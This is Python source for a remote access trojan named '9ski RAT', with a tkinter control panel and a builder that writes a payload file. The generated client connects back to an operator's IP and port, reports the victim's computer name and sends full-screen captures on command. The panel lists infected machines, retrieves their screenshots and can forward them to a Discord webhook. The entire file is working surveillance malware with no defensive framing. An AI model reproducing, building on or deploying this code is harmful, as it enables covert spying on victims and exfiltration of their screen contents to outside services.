import tkinter as tk
from tkinter import simpledialog, messagebox, filedialog, ttk
import socket
import threading
import os
from PIL import ImageGrab, Image
import io
import requests
from plyer import notification

class RATBuilderGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("9ski RAT")
        self.master.configure(bg='#f0f0f0')
        self.master.geometry("900x500")

        self.config_file = "config.txt"
        self.webhook_url = self.load_webhook_url()
        self.listen_port = None
        self.clients = {}

        self.menubar = tk.Menu(master, bg='#333', fg='#fff')
        self.master.config(menu=self.menubar)
        self.create_menus()

        self.frame = ttk.Frame(master, padding="10")
        self.frame.pack(fill=tk.BOTH, expand=True)

        self.client_listbox = tk.Listbox(self.frame, bg="white", font=("Arial", 12))
        self.client_listbox.pack(fill=tk.BOTH, expand=True)

        self.client_menu = tk.Menu(master, tearoff=0)
        self.client_menu.add_command(label="Screenshot", command=self.screenshot_client)
        self.client_menu.add_command(label="Send Screenshot to Discord Webhook", command=self.send_screenshot_to_discord)
        self.client_listbox.bind("<Button-3>", self.show_client_menu)

        self.status_label = ttk.Label(self.frame, text="Status: Not Listening", foreground='red')
        self.status_label.pack(pady=10)

        self.server_thread = None

    def create_menus(self):
        settings_menu = tk.Menu(self.menubar, tearoff=0, bg='#666', fg='#fff')
        self.menubar.add_cascade(label="Settings", menu=settings_menu)
        settings_menu.add_command(label="Set Webhook URL", command=self.set_webhook_url)

        listen_menu = tk.Menu(self.menubar, tearoff=0, bg='#666', fg='#fff')
        self.menubar.add_cascade(label="Listen", menu=listen_menu)
        listen_menu.add_command(label="Set Listen Port", command=self.set_listen_port)

        builder_menu = tk.Menu(self.menubar, tearoff=0, bg='#666', fg='#fff')
        self.menubar.add_cascade(label="Builder", menu=builder_menu)
        builder_menu.add_command(label="Build RAT", command=self.build_rat)

    def set_webhook_url(self):
        self.webhook_url = simpledialog.askstring("Webhook URL", "Enter the webhook URL:")
        if self.webhook_url:
            self.save_webhook_url(self.webhook_url)
            messagebox.showinfo("Success", "Webhook URL set and saved successfully!")

    def save_webhook_url(self, url):
        with open(self.config_file, 'w') as file:
            file.write(url)

    def load_webhook_url(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as file:
                return file.read().strip()
        return None

    def set_listen_port(self):
        self.listen_port = simpledialog.askstring("Listen Port", "Enter the port to listen on:")
        if self.listen_port and self.listen_port.isdigit():
            self.start_server()
            self.status_label.config(text=f"Status: Listening on port {self.listen_port}", foreground='green')
            messagebox.showinfo("Success", f"Listening on port {self.listen_port}!")
        else:
            messagebox.showerror("Error", "Please enter a valid port number.")

    def build_rat(self):
        ip_address = simpledialog.askstring("IP Address", "Enter the IP address to connect to:")
        port = simpledialog.askstring("Port", "Enter the port to connect to:")
        if ip_address and port and port.isdigit():
            file_path = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python files", "*.py")])
            if file_path:
                self.create_rat_file(file_path, ip_address, port)
                messagebox.showinfo("Success", "RAT built successfully!")

    def create_rat_file(self, file_path, ip_address, port):
        rat_code = f"""
import socket
import os
from PIL import ImageGrab
import io

def connect_to_server(ip, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, int(port)))
    client.send(os.environ.get("COMPUTERNAME", "Unknown PC").encode())
    while True:
        command = client.recv(1024).decode()
        if command == "screenshot":
            send_screenshot(client)
        elif command == "exit":
            break
    client.close()

def send_screenshot(client):
    screenshot = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    client.sendall(len(img_byte_arr).to_bytes(4, 'big') + img_byte_arr)

connect_to_server("{ip_address}", {port})
"""
        with open(file_path, 'w') as file:
            file.write(rat_code)

    def start_server(self):
        if self.server_thread and self.server_thread.is_alive():
            return

        if not self.listen_port or not self.listen_port.isdigit():
            messagebox.showerror("Error", "Listen port not set or invalid.")
            return

        def server_task():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(("0.0.0.0", int(self.listen_port)))
                server.listen(5)
                print(f"Listening on port {self.listen_port}...")
                while True:
                    client_socket, addr = server.accept()
                    pc_name = client_socket.recv(1024).decode()
                    self.master.after(0, self.add_client, pc_name, addr[0], client_socket)
                    self.notify_client_connected(pc_name, addr[0])
            except Exception as e:
                messagebox.showerror("Error", f"Server error: {e}")

        self.server_thread = threading.Thread(target=server_task, daemon=True)
        self.server_thread.start()

    def add_client(self, pc_name, client_ip, client_socket):
        client_info = f"{pc_name} ({client_ip})"
        self.client_listbox.insert(tk.END, client_info)
        self.clients[client_info] = client_socket

    def show_client_menu(self, event):
        if self.client_listbox.curselection():
            self.client_menu.post(event.x_root, event.y_root)

    def screenshot_client(self):
        selected_client = self.client_listbox.get(tk.ACTIVE)
        client_socket = self.clients.get(selected_client)
        if client_socket:
            client_socket.sendall(b"screenshot")
            img_size = int.from_bytes(client_socket.recv(4), 'big')
            img_data = b""
            while len(img_data) < img_size:
                img_data += client_socket.recv(img_size - len(img_data))
            img = Image.open(io.BytesIO(img_data))
            img.show()
            messagebox.showinfo("Screenshot", f"Screenshot received from {selected_client}")
        else:
            messagebox.showwarning("Error", "No client selected")

    def send_screenshot_to_discord(self):
        selected_client = self.client_listbox.get(tk.ACTIVE)
        client_socket = self.clients.get(selected_client)
        if client_socket and self.webhook_url:
            client_socket.sendall(b"screenshot")
            img_size = int.from_bytes(client_socket.recv(4), 'big')
            img_data = b""
            while len(img_data) < img_size:
                img_data += client_socket.recv(img_size - len(img_data))
            img = Image.open(io.BytesIO(img_data))

            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            
            webhook_data = {'content': 'Screenshot from client'}
            files = {'file': ('screenshot.png', img_byte_arr, 'image/png')}
            try:
                response = requests.post(self.webhook_url, data=webhook_data, files=files)
                response.raise_for_status()
                messagebox.showinfo("Success", "Screenshot sent to Discord webhook successfully!")
            except requests.RequestException as e:
                messagebox.showerror("Error", f"Failed to send screenshot to Discord: {e}")
        else:
            messagebox.showwarning("Error", "No client selected or webhook URL not set")

    def notify_client_connected(self, pc_name, client_ip):
        notification.notify(
            title="Client Connected",
            message=f"Client {pc_name} ({client_ip}) has connected.",
            timeout=10
        )

root = tk.Tk()
app = RATBuilderGUI(root)
root.mainloop()
